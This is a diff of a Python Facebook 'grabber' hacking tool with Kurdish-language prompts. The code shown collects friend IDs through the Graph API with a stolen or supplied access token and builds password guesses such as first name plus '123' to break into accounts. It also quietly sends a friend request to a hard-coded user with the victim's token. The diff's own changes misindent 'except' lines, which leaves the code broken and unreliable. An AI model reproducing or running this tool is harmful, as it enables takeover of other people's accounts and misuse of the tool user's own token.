@@ -139,7 +139,7 @@ def login():
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				time.sleep(2)
 				menu()
-			except requests.exceptions.ConnectionError:
+			 except requests.exceptions.ConnectionError:
 				print("\n\x1b[33;1m    [%]® XATAKAT XAWA BIGORA\x1b[0m")
 				kelwa()
 		if 'checkpoint' in url:
@@ -156,7 +156,7 @@ def menu():
 	os.system('clear')
 	try:
 		toket=open('login.txt','r').read()
-	except IOError:
+	 except IOError:
 		os.system('clear')
 		print("\x1b[31;1m[#] Your Token Is Expired")
 		os.system('rm -rf login.txt')
@@ -241,7 +241,7 @@ def graber():
 	os.system('clear')
 	try:
 		toket=open('login.txt','r').read()
-	except IOError:
+	 except IOError:
 		print("\x1b[37;1m[\x1b[33;1m T \x1b[0m]\x1b[37;1m Token Expired\x1b[0m")
 		os.system('rm -rf login.txt')
 		time.sleep(2)
@@ -281,7 +281,7 @@ def startgrab():
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
 			print("\x1b[36;1mFacebook Name :  \x1b[33;1m"+op["name"]+"\x1b[0m")
-		except KeyError:
+		 except KeyError:
 			print("\x1b[31;1mID XALATA /\x1b[0m")
 			time.sleep(3)
 			graber()
@@ -299,8 +299,8 @@ def startgrab():
 		print("\x1b[32;1mFacebook ID.......\x1b[0m")
 		startgrab()
 	print("\x1b[32;1m[ ♡ ] HAMW ID YEKAN \x1b[34;1m"+str(len(id))+"\x1b[0m")
-	anime('\x1b[37;1m[ % ] TKAYA BOST........................')
-	titik = ['.', '..', '...', '....', '.....', '......', '.......']
+	anime('\x1b[37;1m[ % ] TKAYA BOST.......')
+	titik = ['.', '..', '..', '....', '....', '....', '.....']
 	for o in titik:
 		print("\r\x1b[32;1m[ ✓ ] HACKING"+o),;sys.stdout.flush();time.sleep(1)
 	anime('\x1b[34;1mBWASTA BO DAST PE KRDNI HACKAKA.........')
@@ -314,7 +314,7 @@ def startgrab():
                 first = us[1]
 		try:
 			os.mkdir('Graber')
-		except OSError:
+		  except OSError:
 			pass #REDHaT
 		try:
 			pass1 = first+"123"
